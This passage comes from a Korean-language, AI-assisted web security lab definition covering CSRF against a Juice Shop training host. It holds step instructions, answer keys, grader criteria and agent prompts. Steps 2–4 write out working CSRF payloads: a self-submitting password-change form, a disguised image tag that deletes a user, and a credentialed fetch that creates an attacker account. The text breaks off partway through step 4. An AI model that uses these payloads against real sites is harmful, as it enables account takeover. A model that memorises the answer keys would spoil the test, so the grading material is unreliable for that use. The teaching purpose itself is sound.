lab_id: web-vuln-ai-week04
title: CSRF(Cross-Site Request Forgery) 실습 (AI 지원)
version: ai
course: web-vuln-ai
week: 4
description: |
  CSRF (Cross-Site Request Forgery) 의 원리·PoC·방어를 Juice Shop (http://juice.6v6.lab) 환경에서
  학습한다. Juice Shop 은 Angular SPA + JWT-in-Header 인증 모델 — 전통적 CSRF (Cookie 자동
  첨부) 가 자동발동 불가능한 modern stack 이라는 사실 자체가 핵심 학습 결과. 이를 통해
  Cookie + Session 기반 legacy 시스템 의 CSRF 위협 모델과 modern SPA + JWT 의 차이를
  명확히 구분한다. 16 step 모두 attacker 컨테이너 (curl/wget/python) 에서 실행하며 stdout
  을 직접 quote 해야 채점 통과.
difficulty: medium
duration_minutes: 120
objectives:
- CSRF 의 원리 (피해자 브라우저 + 자동 cookie 첨부) 와 자동발동 조건을 이해한다
- Juice Shop 의 JWT-Header 인증이 왜 CSRF 면역인지 분석한다 (학습 핵심)
- CSRF 토큰 / SameSite / Referer / CORS 4 계층 방어를 비교한다
- legacy Cookie 기반 시스템 의 CSRF PoC (auto-submit form, img src, fetch credentials) 작성
- 인증방식 × CSRF 방어 매트릭스로 시스템 별 권고를 도출한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: |
    [목표] Juice Shop (http://juice.6v6.lab) 의 메인 HTML 응답에서 CSRF 토큰 (hidden input,
    meta tag, JS 변수) 존재 여부를 확인한다.

    [배경] CSRF 토큰은 *Cookie + Session* 인증을 쓰는 SSR (Django/Rails/Spring MVC) 에서
    필수다. 서버가 form 응답에 `<input type="hidden" name="csrf_token" value="...">` 을
    심어, 다음 POST 에서 token 일치 확인. 외부 사이트는 token 을 알 수 없으니 위조 차단.

    [실행]
      curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10

    [예상 결과] 빈 출력 (또는 Angular framework 의 hidden input 일부 만). 즉 **CSRF 토큰
    없음**. Juice Shop = Angular SPA + JWT-Header 인증이라 cookie 가 자동 첨부되지 않는다 →
    CSRF 가 자동발동 불가능 → 토큰 자체가 불필요한 *modern* 패턴.

    [도구] **curl 단독 의존 금지** — wget / nikto -Tuning x / python BeautifulSoup 도 가능.
    호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.
  hint: |
    grep 결과가 비어 있으면 "CSRF 토큰 없음" 이 정상. 그것이 곧 Juice Shop = JWT-Header
    의 증거. Cookie 인증 시스템 (DVWA, WordPress 등) 의 form 과 비교해 보면 차이가 명확.
  category: csrf_detect
  points: 8
  answer: |
    🤖 프롬프트: Juice Shop (http://juice.6v6.lab) 의 메인 페이지에 CSRF 토큰 hidden input
    이 있는지 확인하고, 결과로부터 인증 모델 (Cookie+Session vs JWT-Header) 을 추정해줘.

    📎 참고 (CLI):
      curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10 \
        && echo 'CSRF 토큰 확인 완료'
  answer_detail: |
    Juice Shop = Angular SPA + JWT-Header 인증. CSRF 토큰 hidden input 이 없는 것이 정상
    이며 modern SPA 의 표준 패턴이다. 반면 Django form, Spring MVC, Rails ERB 같은 SSR +
    Session Cookie 시스템은 csrf_token 필수. 이 step 의 빈 출력은 "취약" 이 아니라 "다른
    위협 모델" 의 증거임을 학습한다.
  verify:
    type: output_contains
    expect:
    - CSRF 토큰 확인 완료
    - http_request
    field: stdout
    semantic:
      intent: |
        Juice Shop HTML 응답에서 CSRF 토큰 (hidden input / meta / JS) 존재 여부 확인. 빈
        결과 = Angular SPA + JWT-Header 인증의 정상 결과 — 학습 핵심.
      success_criteria:
      - curl 로 메인 페이지 가져와 csrf|_token|hidden grep 실행
      - 출력 결과 (빈 출력 또는 일부 Angular hidden input) 의 의미 해석
      - Juice Shop = JWT-Header 라 CSRF 토큰 불필요 사실 명시
      - SSR + Session Cookie 시스템 (Django/Rails) 과의 차이 언급
      acceptable_methods:
      - curl <url> | grep -iE 'csrf|_token|hidden'
      - wget -qO- + grep
      - python BeautifulSoup 로 input 분석
      - browser dev tools DOM 검사
      negative_signs:
      - 빈 결과를 "취약" 으로 오판 (실제는 다른 위협 모델)
      - 인증 모델 (JWT vs Cookie) 추정 누락
      - SSR 시스템과의 차이 설명 없음
  target_vm: attacker
  script: |
    curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10
    echo 'CSRF 토큰 확인 완료'
  risk_level: low
  bastion_prompt: |
    Juice Shop (http://juice.6v6.lab) 의 메인 페이지에 CSRF 토큰 hidden input 이 있는지
    확인하고, 결과로부터 인증 모델 (Cookie+Session vs JWT-Header) 을 추정해줘.

    실행: curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10

    빈 결과가 정상 (Angular SPA + JWT-Header). 출력 1-3줄 ``` 블록으로 quote 한 뒤,
    Juice Shop 의 인증 모델 추정과 그 근거 명시. 마지막에 'CSRF 토큰 확인 완료' echo.
- order: 2
  instruction: |
    [목표] 가상의 Cookie + Session 사이트 의 패스워드 변경 endpoint 를 위조하는 CSRF PoC
    HTML 페이지를 작성한다 (legacy 시나리오 시연).

    [배경] 전형적 CSRF = 피해자가 *이미 로그인된* 사이트의 cookie 가 자동 첨부되는 점을 악용.
    공격자 페이지가 hidden form 을 자동 submit → 피해자의 cookie 가 함께 전송되어 서버는
    정상 요청으로 인식.

    [Juice Shop 적용성] Juice Shop 자체는 JWT-Header 라 PoC 가 *작동 안 함* — 그러나 PoC
    의 *구조* 자체는 Cookie 기반 시스템 (DVWA, WordPress wp-admin, 기업 내 form-based
    web) 에 그대로 적용 가능. 작동 여부 확인 보다 *PoC 구조 이해* 가 목표.

    [실행]
      cat > /tmp/csrf_poc.html <<'HTML'
      <html><body onload="document.forms[0].submit()">
        <form action="http://juice.6v6.lab/profile" method="POST">
          <input type="hidden" name="password" value="hacked123">
        </form>
      </body></html>
      HTML
      head -c 200 /tmp/csrf_poc.html && echo
      echo 'CSRF PoC 작성 완료'

    [도구 권장] curl + cookie jar (-b -c), HTML form 작성, browser 로 PoC 페이지 직접 로드
    가능. 호출 후 **stdout 1~3줄을 ``` 블록으로 직접 quote**.
  hint: |
    onload 자동 submit + hidden input 으로 새 비밀번호 지정 + form action 에 대상 URL.
    legacy Cookie 시스템 가정. Juice Shop 의 JWT-Header 에서는 안 작동.
  category: csrf_craft
  points: 10
  answer: |
    🤖 프롬프트: 가상 Cookie 기반 사이트 (예: WordPress) 의 패스워드 변경 endpoint 를 위조
    하는 auto-submit CSRF PoC HTML 을 /tmp/csrf_poc.html 로 작성하고, Juice Shop 에서는
    왜 작동하지 않는지 설명해줘.

    📎 참고 (CLI):
      cat > /tmp/csrf_poc.html <<'HTML'
      <html><body onload="document.forms[0].submit()">
        <form action="http://juice.6v6.lab/profile" method="POST">
          <input type="hidden" name="password" value="hacked123">
        </form>
      </body></html>
      HTML
      head -c 200 /tmp/csrf_poc.html && echo
      echo 'CSRF PoC 작성 완료'
  answer_detail: |
    auto-submit form 은 피해자가 페이지를 *열기만 하면* 즉시 POST 가 발생하는 핵심 CSRF
    벡터. 단 이 공격은 (1) 피해자가 *대상 사이트에 로그인 중* + (2) 인증이 *cookie + SameSite
    완화* + (3) form action 의 endpoint 가 *Origin/Referer 검증 없음* — 3 조건이 모두 성립
    해야 작동. Juice Shop 은 (1) 만 있고 (2)(3) 가 차단 — JWT-Header 인증이라 cookie 자동
    첨부 자체가 없다.
  verify:
    type: output_contains
    expect: CSRF PoC 작성 완료
    field: stdout
    semantic:
      intent: |
        auto-submit CSRF PoC HTML 작성 — form action + hidden input + body onload submit.
        Legacy Cookie 시스템 가정. Juice Shop 의 JWT-Header 에선 작동 안 함 사실 명시.
      success_criteria:
      - /tmp/csrf_poc.html 파일 생성 + head 출력 quote
      - form action 에 대상 URL + method=POST 포함
      - hidden input 으로 변경할 값 (new password) 지정
      - body onload 자동 submit 또는 iframe src 자동 실행 메커니즘 명시
      - Juice Shop 의 JWT-Header 에서 작동 안 하는 이유 (cookie 자동첨부 부재) 한 줄 명시
      acceptable_methods:
      - HTML form body onload submit
      - iframe srcdoc 로 내장
      - JavaScript fetch POST + credentials include
      - BeEF module 활용
      negative_signs:
      - form action URL 누락
      - 자동 submit 미설정 (사용자 클릭 필요)
      - JWT-Header 에서 안 작동 한다는 사실 누락
      - PoC 작동 전제 (cookie+session) 조건 분석 없음
  target_vm: attacker
  script: |
    cat > /tmp/csrf_poc.html <<'HTML'
    <html><body onload="document.forms[0].submit()">
      <form action="http://juice.6v6.lab/profile" method="POST">
        <input type="hidden" name="password" value="hacked123">
      </form>
    </body></html>
    HTML
    head -c 200 /tmp/csrf_poc.html && echo
    echo 'CSRF PoC 작성 완료'
  risk_level: low
  bastion_prompt: |
    Legacy Cookie 기반 시스템 가정한 패스워드 변경 위조 auto-submit CSRF PoC HTML 을
    /tmp/csrf_poc.html 로 작성. 다음 헤레닥 명령 실행 후 head 결과 quote:

      cat > /tmp/csrf_poc.html <<'HTML'
      <html><body onload="document.forms[0].submit()">
        <form action="http://juice.6v6.lab/profile" method="POST">
          <input type="hidden" name="password" value="hacked123">
        </form>
      </body></html>
      HTML
      head -c 200 /tmp/csrf_poc.html && echo
      echo 'CSRF PoC 작성 완료'

    마지막에 Juice Shop 의 JWT-Header 에서는 왜 작동 안 하는지 한 문장 설명.
- order: 3
  instruction: |
    [목표] `<img src>` 태그를 이용한 GET 기반 CSRF PoC 를 작성하고, RESTful 원칙 위반과의
    관계를 분석한다.

    [배경] 브라우저는 `<img src="...">` 의 URL 을 자동 GET 한다. 만약 서버가 GET 메서드로
    *상태 변경* (계정 삭제, 송금 등) 을 허용한다면, 단순한 이미지 태그만으로 피해자 cookie
    가 자동 첨부된 GET 요청이 발생 → CSRF 성립.

    [근본 원인] RFC 7231 §4.2.1: GET 은 *safe* (서버 상태 변경 금지). 이 원칙을 위반한 API
    설계 (예: `/api/users/1/delete` GET) 가 곧 CSRF 공격면.

    [실행]
      cat > /tmp/csrf_get.html <<'HTML'
      <html><body>
        <h1>Cute kitten gallery</h1>
        <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
      </body></html>
      HTML
      head -c 300 /tmp/csrf_get.html && echo
      echo 'GET CSRF PoC 작성 완료'

    [도구 권장] curl + cookie jar, HTML form 작성, browser 로 페이지 로드. 호출 후
    **stdout 1~3줄 ``` 블록 quote**.
  hint: |
    img src 에 상태 변경 URL 삽입. RESTful 원칙 (GET = safe) 위반 분석 포함. 다른 벡터:
    `<link rel=prefetch>`, `<script src>`, CSS `background-image: url(...)`.
  category: csrf_craft
  points: 10
  answer: |
    🤖 프롬프트: img 태그를 이용한 GET 기반 CSRF PoC HTML 을 /tmp/csrf_get.html 로 작성
    하고, GET 메서드로 상태 변경을 허용한 설계가 왜 위험한지 RFC 7231 관점에서 설명해줘.

    📎 참고 (CLI):
      cat > /tmp/csrf_get.html <<'HTML'
      <html><body>
        <h1>Cute kitten gallery</h1>
        <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
      </body></html>
      HTML
      head -c 300 /tmp/csrf_get.html && echo
      echo 'GET CSRF PoC 작성 완료'
  answer_detail: |
    GET = safe method (RFC 7231) — 상태 변경 금지가 원칙. 위반 시 (1) img 태그 한 줄로
    CSRF 가능 (2) 브라우저 history / 프록시 / 로그에 민감 작업 노출 (3) prefetch / link
    rel 등 다양한 자동 GET 벡터에 노출. 대응: 상태 변경은 항상 POST/PUT/DELETE + CSRF
    토큰 + Origin 검증.
  verify:
    type: output_contains
    expect: GET CSRF PoC 작성 완료
    field: stdout
    semantic:
      intent: |
        GET 기반 CSRF PoC — img src 에 상태 변경 URL. 페이지 로드만으로 자동 GET 발생.
        RFC 7231 GET-safe 원칙 위반과의 관계 분석.
      success_criteria:
      - /tmp/csrf_get.html 생성 + head 출력 quote
      - img src 에 GET 상태변경 URL (예 /api/Users/1?_method=DELETE) 포함
      - 페이지 방문만으로 요청 발생 메커니즘 설명
      - RFC 7231 GET=safe 원칙과 위반 시 위험성 명시
      acceptable_methods:
      - img src <target url>
      - link rel=prefetch
      - iframe src
      - CSS background-image:url(...)
      - script src
      negative_signs:
      - POST 메서드로 오해
      - GET-safe 원칙 언급 없음
      - 자동 GET 벡터 단일 (img 만)
  target_vm: attacker
  script: |
    cat > /tmp/csrf_get.html <<'HTML'
    <html><body>
      <h1>Cute kitten gallery</h1>
      <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
    </body></html>
    HTML
    head -c 300 /tmp/csrf_get.html && echo
    echo 'GET CSRF PoC 작성 완료'
  risk_level: low
  bastion_prompt: |
    GET 기반 CSRF PoC HTML 을 /tmp/csrf_get.html 로 작성. 다음 헤레닥 실행 후 head 출력
    quote:

      cat > /tmp/csrf_get.html <<'HTML'
      <html><body>
        <h1>Cute kitten gallery</h1>
        <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
      </body></html>
      HTML
      head -c 300 /tmp/csrf_get.html && echo
      echo 'GET CSRF PoC 작성 완료'

    마지막에 RFC 7231 GET-safe 원칙과 위반 시 위험성 한 문장 설명.
- order: 4
  instruction: |
    [목표] fetch API 의 `credentials: 'include'` 옵션으로 cross-origin 인증 요청을 위조하는
    AJAX CSRF PoC 를 작성하고, CORS preflight 와의 상호작용을 분석한다.

    [배경] fetch 기본값 = `credentials: 'same-origin'` (cookie 첨부 X). `'include'` 명시
    시 cookie + Authorization 모두 첨부. 단 Content-Type 이 application/json 이면 *simple
    request 가 아닌 preflight* 요청이 발생 → 서버가 OPTIONS 응답으로 허용한 origin 만 통과.

    [세 가지 케이스]
      1. simple request (Content-Type: text/plain) + credentials:include → preflight 없음
      2. JSON request + credentials:include → preflight 발생 → 서버 거부 시 차단
      3. CORS 와일드카드 + credentials:include → 브라우저가 차단 (스펙 위반)

    [실행]
      cat > /tmp/csrf_ajax.js <<'JS'
      fetch('http://juice.6v6.lab/api/Users', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({email: 'evil@attacker.com', password: 'pwned'})
      }).then(r => r.text()).then(console.log);
      JS
      cat /tmp/csrf_ajax.js && echo 'AJAX CSRF 작성 완료'

    [도구 권장] fetch / XHR / axios 또는 curl + cookie jar 로 모방. 호출 후 stdout 1~3줄
    quote.
  hint: |
    credentials:include 가 핵심. Content-Type 에 따라 preflight 발생 여부 달라짐. Juice
    Shop 처럼 Authorization 헤더 인증은 credentials 와 무관 (Authorization 은 fetch 옵션
    headers 에 명시적으로 넣어야 첨부됨).
  category: csrf_craft
  points: 10
  answer: |
    🤖 프롬프트: fetch API + credentials:include 로 cross-origin CSRF 시도하는 PoC JS 를
    /tmp/csrf_ajax.js 로 작성하고, simple request vs preflight 차이 + Juice Shop 의 JWT
    Authorization 헤더가 이 공격에 영향 받지 않는 이유 설명해줘.

    📎 참고 (CLI):
      cat > /tmp/csrf_ajax.js <<'JS'
      fetch('http://juice.6v6.lab/api/Users', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({email: 'evil@attacker.com', password: 'pwned'})
      }).then(r => r.text()).then(console.log);
      JS
      cat /tmp/csrf_ajax.js && echo 'AJAX CSRF 작성 완료'
  answer_detail: |
    credentials:include 는 *cookie 와 HTTP 인증* 을 자동 첨부하지만 *Authorization 헤더*
